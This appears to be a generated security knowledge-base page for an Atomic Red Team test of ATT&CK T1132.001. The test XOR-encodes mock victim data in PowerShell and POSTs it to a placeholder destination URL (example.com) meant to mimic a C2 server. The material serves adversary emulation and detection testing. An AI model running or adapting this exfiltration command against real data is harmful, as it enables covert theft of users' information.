---
atomic_guid: "c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08"
title: "XOR Encoded data."
framework: "atomic"
generated: "true"
attack_technique_id: "T1132.001"
attack_technique_name: "Data Encoding: Standard Encoding"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1132.001/T1132.001.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08"
  - "XOR Encoded data."
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

XOR encodes the data with a XOR key.
Reference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f

## ATT&CK Mapping

- [[kb/attack/techniques/T1132-data_encoding#^t1132001-standard-encoding|T1132.001: Standard Encoding]]

## Input Arguments

### destination_url

- description: Destination URL to post encoded data.
- type: url
- default: example.com

### key

- description: XOR key used for encoding the plaintext.
- type: string
- default: abcdefghijklmnopqrstuvwxyz123456

### plaintext

- description: Plain text mimicking victim data sent to C2 server.
- type: string
- default: Path\n----\nC:\Users\victim

## Executor

- name: powershell

### Command

```powershell
$plaintext = ([system.Text.Encoding]::UTF8.getBytes("#{plaintext}"))
$key = "#{key}"
$cyphertext =  @();
for ($i = 0; $i -lt $plaintext.Count; $i++) {
 $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
}
$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
[System.Net.ServicePointManager]::Expect100Continue = $false
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1132.001/T1132.001.yaml)
